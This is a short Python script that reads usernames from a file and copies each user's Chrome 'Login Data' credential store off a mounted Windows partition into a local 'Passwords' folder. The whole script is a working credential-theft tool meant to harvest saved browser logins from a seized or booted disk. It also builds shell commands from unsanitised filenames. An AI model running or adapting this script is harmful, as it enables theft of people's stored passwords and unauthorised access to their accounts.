prefix=""
import os
currDir=os.system('pwd')
#os.system('ls >> users')
fin=open('users')
data=fin.readlines()
usernames=[]
for i in data:
    if str(i)[:2]==prefix:
        usernames.append(i.strip())
fin.close()

#print(usernames)
for i in usernames:
    try:
        os.system("cp '/media/root/Windows/Users/"+i+"/AppData/Local/Google/Chrome/User Data/Default/Login Data' '/root/Desktop/Passwords/"+i+"'")
    except:
        pass
